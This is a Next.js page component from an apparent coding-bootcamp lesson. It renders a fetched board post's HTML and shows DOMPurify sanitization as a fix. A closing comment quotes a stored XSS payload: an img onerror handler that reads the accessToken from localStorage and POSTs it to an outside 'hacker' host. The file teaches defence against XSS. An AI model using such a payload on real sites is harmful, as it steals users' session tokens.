'use client';

import { gql, useQuery } from '@apollo/client';
import { useParams } from 'next/navigation';
import Dompurify from 'dompurify';

// 게시글 조회하기
const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;
export default function StaticRoutingMovedPage() {
  const params = useParams();

  const { data } = useQuery(FETCH_BOARD, {
    variables: {
      boardId: params.boardId,
    },
  });
  console.log(data);

  return (
    <>
      {/* 내용에 들어있는 태그를 문자열이 아닌 진짜 태그로 인식하기 */}
      {/* <div>내용 : {data ? data.fetchBoard.contents : ''}</div> */}
      {/* <div
        dangerouslySetInnerHTML={{
          __html: data?.fetchBoard?.contents,
        }}
      /> */}

      {/* dompurify를 적용한 후, 내용이 들어있는 태그가 <script/> 처럼 공격태그가 있을 수 있으니 막는방법 */}
      <div
        dangerouslySetInnerHTML={{
          __html: Dompurify.sanitize(data?.fetchBoard?.contents),
        }}
      />

      {/* 2. &&해서 하기 */}
      <div>작성자 : {data && data.fetchBoard.writer}</div>

      {/* 3. ? 옵셔널 체이닝  : 있으면 쓰고, 없으면 쓰지마 */}
      <div>제목 : {data?.fetchBoard.title}</div>
    </>
  );
}

/* playground xss공격
================================================
<script></script> 브라우저도 이걸 공격이란 걸 앎
실패했을때 어떤 script를 실행될 수 있다. 이게 dangerouslySetInnerHTML에 들어가서 onerror로 한 script가 작동하게됌

contents : """
     <img src = "#" onerror='const 훔친토큰 = localStorage.getItem('accessToken'); fetch('http://main-hacker.codebootcamp.co.kr/token',{
        method: 'POST',
        headers: { "content-type": "application/json"},
        body: JSON.stringify({ token: 훔친토큰 })
         })'
       /> 
"""
================================================
*/
